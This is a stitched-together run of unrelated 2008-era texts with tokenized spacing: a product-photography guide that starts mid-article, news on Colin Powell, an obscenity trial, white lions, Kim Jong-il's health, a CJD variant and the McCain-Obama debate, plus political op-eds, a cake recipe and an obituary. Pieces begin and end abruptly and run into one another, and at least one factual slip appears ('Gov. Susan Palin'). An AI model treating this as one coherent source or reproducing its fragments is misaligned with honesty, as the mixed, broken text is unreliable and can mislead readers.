If you ’re just putting the photos online , high - resolution JPEGs are probably fine .
RAW files , on the other hand , carry more data because they are n’t compressed like JPEG or TIFF files , and they carry fewer digital artifacts ; but they take up more space and require special codices and converters to be viewed and edited .
Some cameras have a “ RAW + high - res JPEG ” setting , which gives you both compressed and uncompressed versions of an image .
Do a little research on your camera when deciding which format to use , because some models are automatically set to give a softer focus in JPEG mode .
4. Edit the Photos
This is the final and perhaps most important step of product photography .
This is when you really take your photos to the next level and make them pop .
If you ’ve gotten the lighting right and your camera properly configured , then you are well on your way to great photos .
Factors such as unwanted colors and objects that could n’t be removed during the shoot , though , will require some adjustment .
Surrounding a product in white space is common practice .
This makes the photo convenient to use on websites and in catalogs because it wo n’t clash with other elements .
To make a product float freely in white space , you have to remove the background with masking in your photo editing program .
As common as it is , it is often done poorly , making an otherwise fine photo look amateurish .
Masking properly takes time , especially when you are not working with straight lines .
Photoshop CS4 has a great “ Refine edge ” tool that makes it much easier to correct crooked lines .
Many people also use a variety of artistic effects in Photoshop and other bitmap editors to subtly manipulate their photos .
One such effect is the soft or selective focus , which , as the name implies , softens a portion of the photo while leaving other areas sharp .
This is great for creating the illusion of depth and size , and the trick is often used for pictures of food , jewelry and watches ( see the examples above ) .
Depending on your lens , you can get a similar in - camera effect by setting the aperture low and zooming in on the product from a distance .
Also , depending on the product and the look you ’re aiming for , you could also experiment with the perspective controls in Photoshop .
Most people assume this tool is only good for tall buildings and scenes with noticeable vanishing points , but you can also use it to make geometric objects such as tables and desks appear overpowering , especially when photographed from a low angle ( see Made.com for examples ) .
Additional Tips
Blend Photos With Design
When putting together a collection of product photos , ask yourself if the images you ’re taking will match the color scheme and aesthetic of your website .
The easiest way around such a challenge is to just keep things simple and minimalist .
Use a Gray Card
A gray card is a middle - gray reference that you can set your camera to for accurate and consistent color rendering , especially on older cameras that have limited controls for white balance and color .
A gray card gives a more realistic depiction of your product ’s color and reduces the amount of post - exposure color adjustment you have to make later .
They can be bought at any photography store and for about $ 10 .
Most cameras have a function for taking gray card test photos ; read through the owner ’s manual carefully .
Get a Flexible and Sturdy Tripod
Taking sharp , consistent and professional product photos is nearly impossible without a good tripod .
It can be any regular tripod , but if you are shooting a product on the floor from above , you ’ll probably need a horizontal extension : as the name implies , this tool extends horizontally from the head of the tripod so that you can position your camera directly above and parallel to the product itself .
This prevents linear distortion , vanishing lines and uneven image depth .
The tripod you need will depend on the size of your camera .
If you have a heavy - duty SLR with a long horizontal extension , you ’ll need a solid tripod to support the weight of the camera and prevent shaking .
If you put your tripod in storage , make sure you are able to reset it to the same height and position for your next shoot .
Measure the legs of the tripod , and mark with tape where the feet of the tripod should stand on the ground .
Use Light Reflectors
As mentioned , light reflectors give photos an even spread of light and a fresh look .
They come in many sizes and shapes .
A medium - sized light reflector , one as big as a large pizza , should be more than enough for product photography .
Anything bigger is more appropriate for videography or photographs of people .
Reflectors come with three different surfaces : silver foliated , gold foliated and white .
The gold - and silver - sided reflectors usually reflect the most light , while white reflectors give a softer , warmer glow .
Define the Decision - Making Process
If your standard of quality is high or you ’re working on a team , the lack of a decision - making process can waste a lot of time .
Set clear criteria for what you ’re looking for , and make sure your workflow allows all parties to follow the criteria without constant interruption .
Outsource When Appropriate
If your product is easy to shoot , then outsourcing is a great option .
The most important points to discuss with the photographer beforehand are quality and their willingness and ability to contribute to the editing process .
The quality of the photos will depend on the time spent editing them .
Some photographers do n’t want to get involved with this part , feeling that image masking and other such tedious tasks are below them .
Cover all your bases before starting with the photographer , otherwise the process could turn out to be more expensive and time - consuming than you expected .

Mr. Powell had a tumultuous tenure as President Bush ’s first - term secretary of state , when he was frequently undercut by Vice President Dick Cheney and Donald H. Rumsfeld , the secretary of defense , in the period before the Iraq war .
Although Mr. Powell had major misgivings about the war and what he considered the inadequate number of troops , he not only agreed to the invasion but also made the administration ’s case for war in a presentation to the United Nations Security Council in February 2003 .
Much of what he said is now known to be based on false information provided by the Central Intelligence Agency .
Mr. Powell has been widely criticized for the appearance , including by Mr. Obama , a fact that Mr. Brokaw brought up on Sunday .
Mr. Brokaw read aloud a passage from Bob Woodward ’s most recent book , “ The War Within , ” that quoted former Secretary of State James A. Baker III , a Republican , as saying that Mr. Powell was “ the one guy who could have perhaps prevented ” the war from happening .
Mr. Powell , who friends say remains angry about his time in the Bush administration , briskly responded that “ it was not a correct assessment by anybody that my statements or my leaving the administration would have stopped it . ”
The fissures within the Bush administration and the fractious Republican foreign policy establishment have in the meantime played out in the 2008 presidential campaign .
In many ways , Mr. Powell ’s endorsement reflected the rift between the so - called pragmatists , many of whom have come to view the Iraq war or its execution as a mistake , and the neoconservatives , a competing camp whose thinking played a pivotal role in building the case for war .
Mr. Powell , who is of the pragmatist camp and has been critical of the Bush administration ’s conduct of the war , was said by friends in recent months to be disturbed by some of the neoconservatives who have surrounded Mr. McCain as foreign policy advisers in his presidential campaign .
The McCain campaign ’s top foreign policy aide is Randy Scheunemann , who was a foreign policy adviser to former Senators Trent Lott and Bob Dole and who has longtime ties to neoconservatives .
In 2002 , Mr. Scheunemann was a founder of the hawkish Committee for the Liberation of Iraq and was an enthusiastic supporter of Ahmad Chalabi , the Iraqi exile and Pentagon favorite , who was viewed with suspicion and distaste at the State Department during Mr. Powell ’s tenure .
Darryn Walker , a 35 - year - old civil servant from Mowbray Road , South Shields , will go to trial next year after being accused of publishing an obscene story on the internet .
Walker was arrested earlier this year , after allegedly posting a work of fantasy titled Girls ( Scream ) Aloud - about pop group Girls Aloud - on the internet .
Further details here .
This morning , Walker appeared in court , to face charges of publishing an obscene article contrary to section 2 ( 1 ) of the Obscene Publications Act 1959 .
His case was set for trial on 16 March 2009 .
He did not enter a plea , though he may do so between now between now and the trial .
His legal team presented a " position statement " to the court highlighting the importance of the case .
The case appears to be the first prosecution of an individual under the OPA in respect of publishing written material in nearly 20 years .
Previous actions against written material have been almost universally unsuccessful .
If this one succeeds , it will change the internet landscape for good , or at least until an appeal comes along to overturn that ruling .
He is represented by Andrew " Brian " Mark , a barrister with Broad Chare Chambers , one of the largest sets of barristers ’ chambers on the North Eastern circuit . ®
Pictured : Rare images of the beautiful white lions that have gone back to the wild
This beautiful white lion family look as if they were born free to live in the wild .
But they are the first to be released from captivity to live in their natural habitat under a pioneering £ 2 million conservation project .
Thirty years ago white lions indigenous to the Timbavarti region of South Africa were at risk of being decimated by poachers and were removed for their own protection .
Back to the wild :
Two male white lions that form part of a beautiful and rare white lion family roaming free in the the 130,000 acre Sanbona Wildlife Reserve
They were kept in captivity , fed and cared for by keepers .
To see a self - sustaining white lion family out in the wild was unheard of .
But the lions have now been reintroduced into their natural habitat and have learned to hunt for themselves and mate in the wild for the first time since the 1970s .
In the Western Cape 's 130,000 - acre Sanbona Wildlife Reserve the plan is to establish the world 's only free - ranging and self - sustaining integrated pride of white and tawny lions .
Hope for the future :
Two of the white lion cubs trot through the grass
" Since we released them they have being fending for themselves - it's fantastic , " said Paul Vorster , wildlife manager at the reserve .
" The project is an astounding success , an unbelievable achievement .
" There was great concern as to how the lions , especially the females , would fit into their new environment .
" They adapted quickly , however , and worked out the location of optimum resources fairly soon after their release .
" The lions had been completely humanised and relied on us for so many things .
" To see their white offspring fending for themselves , having broken down the dependency and bond between man and lion , is very satisfying .
Company : A male white lion with a young female white lion
" What we are actually doing is securing the white lion gene in a safe natural environment . "
The white lion family - including two adult males and two juvenile female lions and five cubs - now roam freely in the semi-arid reserve .
The striking images show the pride living and behaving naturally , bringing hope that these beautiful creatures can sustain themselves in the wild once again .
" In these photos the white lions are showing natural lion behaviour , displaying differing levels of curiosity and we all know how cats are associated with curiosity , " Mr Vorster said .
" Another obvious message that comes from the images is the strong bond between members of the pride .
All in the family : A female white lion with two white male cubs
" This is demonstrated by the close proximity of the father to the cubs .
These actions are aimed to strengthen this bond .
" In the photos the dominance of the male is obvious .
His stately and proud stance staking his claim to his female , his cubs and his territory .
" To watch young lions teasing , stalking and playfully chasing each other in the early morning sun is quite something .
" There is a local belief that the white lions appear in times of great hardship , and they bring good luck with them , which is surely a good omen . "
The five - year £ 2.25 million project has been undertaken by The Mantis Collection - a company which owns a series of hotels and wildlife reserves - to return wildlife to the area .
Africa 's lion population has fallen from 100,000 to 25,000 in the last 30 years , according to charity Born Free .
Ever since Joe Biden suggested that the world would “ test ” Barack Obama if he becomes president , the McCain campaign has been hoping to make political hay out of the remark .
“ We do n’t want a president who invites testing from the world , ” John McCain warned voters .
But every new president is “ tested ” by national security crises , some predictable , some not .
And I ’m a lot less worried about the tests “ the world ” may offer Obama than about the national security booby traps the Bush administration is leaving behind for him .
Start with Iraq .
The Dow ’s gyrations have pushed it off the front pages , but it ’s still there -- along with nearly 150,000 U.S. troops ( compare this to “ pre-surge ” troop levels of 132,000 to 135,000 ) .
And the administration appears to be doing its best to make Obama ’s planned troop drawdown difficult .
We ca n’t leave behind a stable Iraq without the cooperation of Iraq ’s neighbors , but this week ’s cross - border raid by Iraq - based U.S. troops into Syrian territory led Syria to break off high - level diplomatic contacts with U.S. officials -- contacts that had only recently been resumed .
Heated negotiations over the future status of U.S. forces in Iraq have further increased tensions with Syria , Iran and the Iraqi government , which fear permanent U.S. military activities in the region .
The current impasse in status - of - forces negotiations also threatens to leave U.S. troops in Iraq with no legal basis for their presence when their United Nations mandate expires Dec. 31 .
Happy New Year , Barack !

Then there ’s Afghanistan .
The Bush administration followed early military successes with grandiose promises of democracy and prosperity , then mostly ignored Afghanistan for the next six years .
Meanwhile , the Taliban reconstituted itself , Al Qaeda leaders slipped away into Pakistan ’s ungoverned tribal regions , and U.S. troops found themselves playing an increasingly deadly game of Whac - a - Mole against an elusive and ill - defined enemy .
According to the latest national intelligence estimate , Afghanistan is now in a possibly irreversible “ downward spiral . ”
For years , Obama has criticized the administration for taking its eye off the ball in Afghanistan and has pledged more troops and resources to “ finish the job . ”
But it ’s no longer clear what the “ job ” is , and whether it ’s one our troops have a realistic chance of finishing .
We know from Iraq that countering insurgencies requires a long , hard slog -- success not guaranteed -- and that the presence of foreign troops can help fuel nationalist insurgencies .
More troops in Afghanistan might have turned things around if those troops -- and a less stingy reconstruction package -- had arrived five years ago , when Afghan hopes were high .
But after years of Bush administration malfeasance , increasing U.S. troop levels without an accompanying dramatic shift in regional strategy risks turning Afghanistan into another Iraq .

Or worse , because the Afghan booby trap is wired tightly to the Pakistan booby trap .
Pakistan is the proud but horrifyingly unstable possessor of a nuclear arsenal .
If the escalating conflicts in the Afghanistan - Pakistan border regions spin out of control , we could end up in another Iraq - like situation -- only with weapons of mass destruction in the mix for real this time .
Increasingly , U.S. forces have sought to reduce violence inside Afghanistan by staging cross - border counterattacks against suspected Taliban and Al Qaeda targets based inside Pakistan .
Tactically , there ’s some logic to this .
Strategically , not so much .
Pakistan has never been a paragon of stability , and years of unconditional Bush administration military aid for Pervez Musharraf ’s repressive government made things worse .
Now , with the Bush administration increasingly violating Pakistani sovereignty with cross - border strikes , relations between the United States and the new government of Asif Ali Zardari are more tense than ever .
In principle , Obama agrees that strikes inside Pakistan may at times be justified -- but experts close to him suggest that many of the strikes authorized by the Bush White House probably would n’t have passed muster for Obama .
But that may not matter .
Like it or not , Obama will inherit a situation in which U.S. credibility and popularity in Pakistan are close to zero and the Pakistani government is only barely in control .

It ’s a situation that ’s virtually designed to blow up in his face .
Some booby traps left by departing administrations are harmless .
Clinton pranksters allegedly removed all the “ W ” keys from White House computer keyboards in January 2001 , and outbound Bush 41 staffers reportedly left drawers full of pencils cut down to inch - long stubs .
But no one got hurt .
If we can someday say the same about the booby traps this Bush administration is leaving behind , we ’ll be very lucky .

It 's like a tic .
Or a reflex .
( Are tics and reflexes significantly different ? )
The point is , it 's an automatic response , in virtually all humans , to think that things are getting worse .
Medieval peasants lamented how good the Cro-Magnons had it ; people in the Renaissance looked back on the Dark Ages with great fondness .
This is a harmless enough reflex - - lazy and uncritical , sure , but usually harmless enough .
But when it concerns how we see young people , and how we perceive the landscape of learning and literacy , this kind of doomsaying is a goddamned dangerous kind of intellectual sloth .
When we assume , as most adults do , that kids are less literate , less interested in books , than ever before , it involves a willful kind of ignorance , and it imperils how we educate young people .
Few if any of these dire assumptions -- that no one under 18 reads , that all books will be obsolete by 2020 -- are borne out by any proof whatsoever .
The truth is that American publishers put out 411,000 individual titles last year , an all - time record , and netted $ 25 billion - - hardly a sagging industry .
And those kids who have abandoned books for electronic media ?
Since 2002 , juvenile book sales have shown compound annual growth of 4.6 percent for hardcover books and 2.1 percent for paperbacks .
Anecdotally , we know this .
We know about Harry Potter , Lemony Snicket , Eldest -- these juggernauts of contemporary youth literature -- but still we cluck with acknowledgment when some pundit tells us that books are being crushed by an all - powerful digital junta .
It must be true , we think -- just yesterday I saw some kid on the bus , and he was n't reading a book !
Since 2002
I 've taught a class for high schoolers around the Bay Area .
We meet once a week , and the 20 or so students come to read everything they can get their hands on , from The Paris Review to Transition to , well , Esquire .
Every so often , I bring some of these assumptions I 've heard to the class .
I ask how many of them have Facebook pages ( three of 20 ) ; how many spend more than an hour a day on the Internet ( one said he did ) ; and how many play World of Warcraft ( only one , Terence Li , a kid who grew up in the roughest neighborhood in the city , reads The Kenyon Review for fun , and is headed to Stanford next year loaded down with scholarships ) .
One of the scholarships he won was given by our nonprofit center , 826 Valencia .
We started six years ago as a writing and publishing center that would promote literacy and book - devouring among young people in the Mission District of San Francisco .
Since then , six other cities have opened 826 centers .
In San Francisco , we had a dinner recently for the four scholarship winners , all of whom are from low - income families , three of whom will be the first members of their families to attend college , and all four are voracious readers .
I told Brianda Castro , headed to UC Riverside next year , that Michael Chabon and his wife were founders of the scholarship program .
She lit up .
" I just read his book ! " she said .
The Amazing Adventures of Kavalier & Clay was n't assigned in any class ; she just read it because it looked like a good book .
( Oh , also :
She came to this country at age nine , from Mexico , speaking no English . )
The primary problem is that we look for gloomy statistics .
Last year the National Endowment for the Arts issued a study that proclaimed that leisure reading was down overall , especially among the young .
The study was much talked about , and again , much accepted .
But soon a group of educators began to question the methods of the study , and the parsing of the results .
Now , thankfully , the study is taken with a grain of salt .
I 'll always oppose any statistical extrapolations that summarize the intellectual disposition of an entire generation .
These " it 's worse now than before " studies are always framed to imply that the teens ' parents , at the same age , read more .
And that their grandparents , well , they read their asses off .
But this is simply not true .
Far more Americans are educated now than they were 100 years ago , and infinitely more go to college .
As a result , there is now a pool of potential readers that is far larger than it was a century ago .
And books , thank God , are easier to find and afford now than at any time in human history .
Desktop software and print - on - demand technologies make it possible for anyone to create a book , and more - democratic distribution processes allow these small publishers -- more than 100,000 of them , by most estimates -- to get their books to anyone , anywhere .
And it allows us , at 826 Valencia , to publish our students , too .
Every year we partner with a local high school to put together an anthology of the students ' finest work .
And to get in that book , to have their work rendered immortal by being bound between those covers , these students will stop at nothing .
You think what I 'm going to write is worth putting in a book ?
they say .
We say , You 're damned right it is .
And then they get serious .
They come after school , on weekends , and vacations to work on their writing , and why ?
Because at the end of the process , they 'll be published in book form .
I remember one student -- I 'll call him Carlos - - who had been coming in mornings before school , he'd been late to soccer practice after school , and now he was coming during lunch .
I asked him if he was really going to skip lunch to go over his essay one more time .
" I gotta get in that book , " he said , then pointed to the wall of books behind us .
" I want to be on that shelf . "
Books , inherently , require faith .
Faith in an author that he or she will reward the many hours you 'll spend in those pages , faith that a good story will be told , a lesson will be learned , a light will be shone upon a dim corner of the world .
If you 're reading this magazine , with its vast and rich history of literary achievement , you 're alive to the pleasures of reading -- for school or for no good reason at all .
Now you have to give teenagers the benefit of the doubt , that they know what you know , that they do read and will read , that they will keep books alive , as alive as ever -- that they will continue to pull the books from the shelves and add to those shelves books of their own .

But the other , less noticed lesson of the year has to do with the white people the McCain campaign has been pandering to .
As we saw first in the Democratic primary results and see now in the widespread revulsion at the McCain - Palin tactics , white Americans are not remotely the bigots the G.O.P. would have us believe .
Just because a campaign trades in racism does n’t mean that the country is racist .
It ’s past time to come to the unfairly maligned white America ’s defense .
That includes acknowledging that the so - called liberal media , among their other failures this year , have helped ratchet up this election cycle ’s prevailing antiwhite bias .
Ever since Obama declared his candidacy , the press ’s default setting has been to ominously intone that “ in the privacy of the voting booth ” ignorant , backward whites will never vote for a black man .
A leading vehicle for this journalistic mind - set has been the unending obsession with “ the Bradley effect ”  as if nothing has changed in America since 1982 , when some polls ( possibly for reasons having nothing to do with race ) predicted erroneously that a black candidate , Tom Bradley , would win the California governorship .
In 2008 , there is , if anything , more evidence of a reverse Bradley effect 
Obama ’s primary vote totals more often exceeded those in the final polls than not  but poor old Bradley keeps being flogged anyway .
So do all those deer hunters in western Pennsylvania .
Once Hillary Clinton whipped Obama in the Rust Belt , it ’s been a bloviation staple ( echoing the Clinton camp ’s line ) that a black guy is doomed among Reagan Democrats , Joe Sixpacks , rednecks , Joe the Plumbers or whichever condescending term you want to choose .
( Clinton at one low point settled on “ hard - working Americans , white Americans . ” )
Michigan in particular was repeatedly said to be slipping out of the Democrats ’ reach because of incorrigible racism  until McCain abandoned it as hopeless this month in the face of a double - digit Obama lead .

The constant tide of anthropological articles and television reports set in blue - collar diners , bars and bowling alleys have hyped this racial theory of the race .
So did the rampant misreading of primary - season exit polls .
On cable TV and the Sunday network shows , there was endless chewing over the internal numbers in the Clinton victories .
It was doomsday news for Obama , for instance , that some 12 percent of white Democratic primary voters in Pennsylvania said race was a factor in their choice and three - quarters of them voted for Clinton .
Ipso facto  and despite the absence of any credible empirical evidence  these Clinton voters would either stay home or flock to McCain in November .
The McCain campaign is so dumb that it bought into the press ’s confirmation of its own prejudices .
Even though registered Democrats outnumber Republicans by 1.2 million in Pennsylvania ( more than double the 2004 gap ) , even though Obama leads by double digits in almost every recent Pennsylvania poll and even though no national Republican ticket has won there since 1988 , McCain started pouring his dwindling resources into the state this month .
When the Democratic Representative John Murtha described his own western Pennsylvania district as a “ racist area , ” McCain feigned outrage and put down even more chips on the race card , calling the region the “ most patriotic , most God-loving ” part of America .

I ’m pretty excited because I finally baked the Triple Malt Chocolate Cake from Chowhound .
It was so easy it almost made itself , but what was difficult was finding the right kind of malt powder .
In this recipe , the type of malt powder that works best is the unsweetened type made by Carnation or Horlick ’s .
I believe Ovaltine makes it too , but if you buy Ovaltine , check to make sure it ’s actual malted milk powder and not drink mix .
Ovaltine makes all kinds of products and I know one of the malted products contains a lot of extra ingredients plus sugar .
That ’s the one you do n’t want .
To be safe , look for Carnation .
The Triple Malt Chocolate Cake from Chowhound was a big success and I ’d definitely recommend it for malt lovers .
It was very malty .
UPDATE : I tried some more of this cake on Day 2 and it was even better .
I think next time I will use a different frosting .
This one tasted good , but had so much butter it really firmed up in the refrigerator .
For the recipe , click the link to chowhound .
For the frosting , I would recommend this one , originally from Dorie Greenspan .
Malted Chocolate Frosting for Malt Chocolate Cake
6 ounces bittersweet chocolate , coarsely chopped
1/3 cup ( packed ) light brown sugar
1/4 cup malted milk powder ( such as Carnation , Ovaltine or Horlick ’s )
1 tablespoon unsweetened natural cocoa powder
1/4 cup boiling water
2 sticks ( 8 ounces ) unsalted , butter , at room temperature
Pinch of salt
3/4 teaspoon pure vanilla extract
2 1/4 cups confectioners ’ sugar
Melt chocolate and half of the brown sugar together in a heat - proof bowl set over a pan of barely simmering water or in top of a double boiler .
Let cool slightly .
Stir remaining brown sugar , malted milk powder , cocoa powder and boiling water together in a small bowl or glass measuring cup .
Beat butter in bowl of a standing mixer .
When creamy , beat in melted chocolate , followed by malted milk powder mixture .
Beat in vanilla .
Stir in the powdered sugar ; beat until it is well mixed .
Chill mixture for 30 minutes to hour or until it is good and cold .
Return bowl to stand mixer and beat chilled icing until it becomes light and fluffy .

MIAMI - Gerard Damiano , director of the pioneering pornographic film that lent its name to the Watergate whistleblower known as " Deep Throat , " has died .
He was 80 .
Damiano died Saturday at a Fort Myers hospital , his son , Gerard Damiano Jr. , said Monday .
He had suffered a stroke in September .
" He was a filmmaker and an artist and we thought of him as such , " the younger Damiano said .
" Even though we were n't allowed to see his movies , we knew he was a moviemaker , and we were proud of that . "
Damiano's " Deep Throat " was a mainstream box - office success and helped launch the modern hardcore adult - entertainment industry .
Shot in six days for just $ 25,000 , the 1972 flick became a cultural must - see for Americans who had just lived through the sexual liberation of the 1960s .
The film 's title also became associated with one of the most famous anonymous sources in journalism .
While investigating the Watergate scandal , Washington Post reporters Bob Woodward and Carl Bernstein used it as a nickname for their source , former FBI official W. Mark Felt .
Information from Felt helped bring down Richard Nixon 's presidency .
Born in New York in 1928 , Damiano worked as a hairdresser , spent time in the Navy and directed several adult films .
The younger Damiano said he would often accompany his father on film sets as a child , but would be ushered out during " nitty - gritty " scenes .
" We were n't allowed to see certain parts of it , " the son said .
" But my parents always felt that it was nothing to be ashamed of , what he did . "
After " Deep Throat " opened in Times Square , attention from media critics and outraged conservatives - including repeated legal challenges - helped turn it into a hit .
" My father never dreamed that it would get that kind of attention , " the younger Damiano said .
But despite the attention , the son said the film was not his father 's favorite .
" He was fond of it for what it was , but in terms of filmmaking , he would never call it a great film , " he said .
Gerard Damiano is survived by his son and daughter .
No formal services are planned .
North Korean leader Kim Jong-il was absent on Tuesday North Korea has rebuffed reports that leader Kim Jong - il is seriously ill , following his failure to appear at an important military parade .
North Korean diplomat Song
Il - ho told Kyodo news agency such reports were " worthless " and a " conspiracy plot " .
South Korea 's intelligence agency told MPs that Mr Kim had suffered a stroke but was likely to fully recover .
He is not yet able to appear in public , but is still capable of running the country , MPs were told .
The reclusive leader was absent from a parade in Pyongyang on Tuesday to commemorate the 60th anniversary of the foundation of North Korea .
Abnormal indications
The North Korean diplomat in charge of relations with Japan , Song Il - ho , was the first Pyongyang official to dismiss claims that the leader was seriously ill .
WHO IS KIM JONG -IL ?
N Korea 's " Dear Leader " is a reclusive character , at the centre of an elaborate personality cult Succeeded his father Kim Il- sung , founder of North Korea , who died in 1994 Mr Kim is seen in the West as both a master manipulator , and delusional madman
He has a reputation as a drinker , a playboy and a hypochondriac
Rumours provide wake - up call N Korea 's secretive ' first family '
Profile : Kim Jong-il
He told Kyodo news agency that Western media frequently reported falsehoods about his country .
The communist state 's deputy leader , Kim Yong - nam , was later quoted , again by Kyodo , as saying there was " no problem " .
But outside the secretive nation speculation continues about Mr Kim 's health .
South Korean President Lee Myung - bak convened an unscheduled meeting on Wednesday with his senior secretaries to discuss " countermeasures to a possible serious illness of the North Korean leader " , a source at the presidential office said .
A ranking intelligence officer from the president 's office in Seoul said a number of " unusual goings - on " had been detected , South Korea 's Yonhap news agency reported .
Pyongyang 's second - most senior politician oversaw Tuesday 's parade
An intelligence official reportedly told South Korean MPs that Mr Kim had suffered a cerebral haemorrhage which caused a stroke , but added that he was in a " recoverable condition . "
The 66 - year - old leader is said to be too ill to appear in public , but remains conscious and able to lead the country .
The BBC's John Sudworth , in Seoul , says rumours were already rife even before Mr Kim missed Tuesday 's military parade .
But Mr Kim 's absence will prompt further speculation , especially given the symbolic importance of the anniversary and the fact he oversaw similarly triumphant occasions for North Korea 's 50th and 55th anniversaries .
Mr Kim has not been seen in public since early last month .
He has been known to disappear from public view for extended periods before , only to reappear unheralded later .
This time , however , the rumours of ill health have been given added impetus by news that a team of Chinese doctors was recently summoned to examine him .
Food shortages Concerns about Mr Kim 's health come amid an impasse in international efforts to urge North Korea to abandon its nuclear programme .
North Korea agreed in February 2007 to give up its nuclear ambitions in return for aid and diplomatic concessions , but the progress of the deal has been far from smooth .
After a long delay , Pyongyang handed over details of its nuclear facilities in June 2008 .
In return , it expected the US to remove it from the list of state sponsors of terrorism , which the US has yet to do , so the North now appears to be starting to reassemble its main nuclear plant .
Meanwhile the World Food Programme estimates that North Korea is suffering from a serious food shortage .
The North has relied on foreign assistance to help feed its 23 million people since its state - controlled economy collapsed in the mid-1990s .

The patients ' brains had the familiar spongy tissue make - up A new form of Creutzfeldt - Jakob disease ( CJD ) may have been uncovered in a handful of patients in the US .
Ten people have so far died from a fast - advancing form of fatal dementia called PSPr , New Scientist reports .
Patients develop the trademark brain damage associated with CJD - the type not linked to BSE - but scientists believe there may be a genetic cause .
Experts in the UK are now checking records to see if any cases have happened across the Atlantic .
There are between 50 and 100 new cases of so - called sporadic CJD diagnosed in the UK every year .
Unlike " variant CJD " , the human form of BSE in cows contracted by eating contaminated brain tissue in the 1980s and 1990s , the cause of most cases of sporadic CJD is unknown .
The new cases were referred to CJD surveillance units in the US because they were a suspiciously fast - advancing form of dementia with additional symptoms such as the loss of the ability to speak and move , even though traditional tests that normally help diagnose CJD proved negative .
Post - mortems on those who died revealed the familiar " spongy " brain tissue , covered with tiny holes .
These are thought to be caused by the accumulation of " prions " , a misshapen version of a normal brain protein .
' Unnoticed ' Dr Pierluigi Gambetti , director of the US National Prion Disease Pathology Surveillance Center , in Ohio , said that he believed the newly discovered type had probably " been around for years , unnoticed " .
He suggested one interesting common factor was that the patients came from families with a history of dementia , suggesting a genetic cause , but did not carry the gene traditionally associated with a small number of sporadic CJD cases .
Dr Mark Head , from the UK's National CJD Surveillance Unit , in Edinburgh , said the finding had prompted scientists to start reviewing cases of sporadic CJD in this country to see if there were any of the newly discovered version .
He said : " What is interesting about this is that it may mean there are other genes out there waiting to be found which are associated with prion disease , and looking at these patients in the US could help find them . "

Ron Paul 's Rally for the Republic
Challenges McCain , Imperial Republicans
( Image by Unknown Owner ) Details DMCA
Michael Collins
Washington , DC
There 's a bold new look to the Republican Convention in Minnesota and it's not the former Miss Alaska aspirant Gov. Susan Palin , McCain 's surprise choice for vice president .
The Rally for the Republic will celebrate the candidacy of Ron Paul ( R - TX ) for president and the broader movement of Republicans fed up with the degradation of governance and the nation under the Bush - Cheney regime .
This is a significant event given Paul 's performance in the presidential primaries .
He made major inroads in primary contests throughout the nation despite being dismissed by the major media and questionable vote counting in states with electronic voting devices .
These worst - in - class technologies take and count votes in secret .
In addition to the many studies showing the machines vulnerability to tampering , the name of Republican mastermind Karl Rove has surfaced in a major election fraud case in Ohio federal court .
Nevertheless , the Paul campaign energized paleo - conservatives and Libertarian leaning Republicans and independents who embraced his vision to end meaningless foreign adventures , implement unrestricted competition for business , and restore civil liberties removed in the past seven years .
Paul started out by winning 10 % of the popular vote in New Hampshire , three points behind McCain 's 13 % .
He placed second in the following primaries ( by state population ) : Pennsylvania ( 16 % ) , Indiana ( 8 % ) , Oregon ( 15 % ) , Nevada ( 14 % caucus ) , New Mexico ( 14 % ) , Nebraska ( 13 % ) , Idaho ( 24 % ) , Montana ( 22 % - primary ) , Montana ( 25 % caucus ) , South Dakota ( 17 % ) .
These totals , particularly in hotly contested Pennsylvania and politically unpredictable Oregon , must have McCain strategists thinking ( as it were ) .
It could mean simply writing off Oregon and putting even more resources than they had planned into Pennsylvania .
New Mexico and Nevada are two states that could go either way , presenting another resource demand on McCain , who trails Obama three to one among small donors .
Congressman Paul will speak Monday , Sept. 1 , for an hour at 10:00 pm , Central Daylight Time , and for another hour on Tuesday at 7:05 , CDT .
The entire event will be covered on web cast by RepublicMedia .
TV with full commentary and interviews and also by C - Span .

Oct. 8 , 2008  --
Hoping to reverse the momentum that has allowed Barack Obama to open a lead in the polls just a month before the election , John McCain began the second presidential debate Tuesday night by offering a new proposal aimed at helping struggling homeowners avoid foreclosure .
The Arizona senator said he would cut taxes for all Americans and proposed a new policy in which the Treasury secretary would " buy up bad home loan mortgages . "
The proposal would cost about $ 300 billion , which the campaign says would come out of the $ 700 billion financial bailout package passed by Congress last week , according to a fact sheet distributed by the McCain campaign .
" Let people be able to make those payments and stay in those homes , " McCain said .
" Is it expensive ?
Yes .
But until we stabilize , we 're never going to be able to turn around and fix jobs .
We got to bring trust and confidence to America , and I know how to do that . "
Though the candidates sparred on a wide range of issues including foreign policy and health care , the first question handled by the candidates echoed the seminal question in the minds of American voters , from Joe Six - Packs to soccer moms -- what does the economic crisis mean to average Americans ?
Both made a point to portray himself as a reformer who believes strong leadership and government involvement is necessary to fix the economy .
" Americans are angry , they 're upset and they 're a little fearful , " McCain said of the economy .
Calling the global downturn the " worst financial crisis since the Great Depression , " Obama blamed President Bush and , by association , McCain , whom he said supported the failed policies of the Bush administration .
" I believe this is a final verdict on the failed economic policies of the last eight years , strongly promoted by Bush and supported by McCain , " he said .
McCain Looks to Turn the Tide
The candidates met Tuesday night at Belmont University in Nashville , Tenn. , for their second of three debates , with the pressure on McCain , who is trailing in the polls , to persuade people to reconsider how many of them are planning to vote .
In the days leading up to the debate , McCain had said he wanted to shift the national dialogue away from the ongoing economic crisis and onto the Illinois senator 's character .
The two were expected to hammer out clear differences , and the second meeting between the candidates was seen as a chance for McCain to reverse a recent slide in the polls , leaving him trailing in key battleground states .
Both men took the opportunity to make small digs at each other , but the debate featured none of the personal , ad hominem negative attacks that pundits had predicted .
At one point McCain referred to Obama as " that one , " saying the " energy bill loaded down with goodies and sponsored by Bush and Cheney .
Who voted for it ?
You would 've never guessed -- that one .
Who voted against it ?
Me . "
He also questioned Obama 's tax policy , saying , " Nailing down Sen .
Obama 's various tax proposals is like nailing Jell - O to the wall .
The last president to raise taxes during tough economic times was Hoover . "
To which Obama parried : " I think the ' Straight Talk Express ' lost a wheel on that one . "
The town hall - style debatewas moderated by Tom Brokaw of NBC News , who asked just a handful of the hundreds of thousands of questions submitted over the Internet .
Another dozen or so questions were asked by a group of 80 undecided voters from the Nashville area selected by the Gallup Poll .
McCain favors the town hall format and had previously challenged Obama to other town hall debates , a fact that led to the evening 's first zinger .
" It 's good to be with you at a town hall meeting , " McCain said to Obama , who refused McCain 's invitation to meet for weekly town - hall debates .
But the town hall style never fully took off , with the candidates rarely engaging the audience or each other and Brokaw chiding the candidates for not sticking to the time limits .
Asked whom they would nominate as Treasury secretary in their respective administrations , McCain suggested former eBay CEO Meg Whitman , while Obama suggested Berkshire Hathaway CEO Warren Buffett .
